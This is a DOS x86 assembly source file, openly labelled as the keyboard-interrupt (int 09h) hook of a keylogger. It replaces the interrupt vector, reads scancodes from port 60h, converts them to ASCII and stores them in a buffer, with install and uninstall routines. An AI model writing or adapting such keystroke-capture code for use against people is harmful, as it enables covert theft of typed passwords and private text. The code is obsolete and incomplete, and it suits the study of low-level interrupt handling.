; This is int 09h override for keyloger to get chars into buffer

;testing purposes


KBD equ 060h

install_keyboard_handler:
  pusha
  push ds
  push es
  ;blocking usage of interrupts
  cli
  ;initializing es to be 0 (int table is in 0th segment)
  xor ax, ax
  mov es, ax
  ;saving old value of offset
  mov ax, [es:09h*4]
  mov [old_09h_offset], ax
  ;saving old value of segment
  mov ax, [es:09h*4+2]
  mov [old_09h_segment], ax
  ;installing this interrupt
  ;offset
  mov ax, keyboard_handler
  mov [es:09h*4],ax
  ;segment is same as this code segment - com only
  mov [es:09h*4+2], cs
  mov cx, 200
  ;unblocking usage of interrupts
  sti
  pop es
  pop ds
  popa
  ret

uninstall_keyboard_handler:
  pusha
  push ds
  push es
  mov ax, cs
  mov ds, ax
  ;blocking usage of interrupts
  cli
  ;initializing es to be 0 (int table is in 0th segment)
  xor ax, ax
  mov es, ax
  call set_ds_to_tsr 
  ;recovering this interrupt
  ;offset
  mov ax, [old_09h_offset]
  mov [es:09h*4],ax
  ;segment
  mov ax, [old_09h_segment]
  mov [es:09h*4+2], ax
  ;unblocking usage of interrupts
  sti
  pop es
  pop ds
  popa
  ret
   
keyboard_handler:
  pusha
  push ds
  push es
  ;setting ds to be able to use labels
  mov ax, cs
  mov ds, ax    
  
  ;get pressed letter or number to al
  in al, KBD
  

  ;converting to ascii
  mov bx, xlat_lowercase_table
  ;if it is not press scancode then ignore it
  mov ah, al
  and ah, 080h
  jnz .i_dont_want_it
  
  xlat
  or al, al
  jz .i_dont_want_it
  ;sync
  cli  
  ;working on it
  ;taking info about buffer
  mov bx, buffer
  mov di, [buffer_size]
  ;putting key pressed ascii at end of the buffer
  mov [bx + di], al
  ;incrementing current buffer size
  inc di
  ;updating buffer size in memory
  mov [buffer_size], di
  sti
 .i_dont_want_it: 
  ;chaining interrupts
  ;sending flags because I have iret waiting in old interrupt
  cli
  pushf
  call far word [old_09h]
  sti


  mov cx, [buffer_size]
  mov ax, ds
  mov es, ax
  mov di, buffer
  pop es
  pop ds
  popa
  iret

segment .data

old_09h:
old_09h_offset:  dw 0
old_09h_segment: dw 0
buffer_size: dw 0
buffer: times 1000 db 0



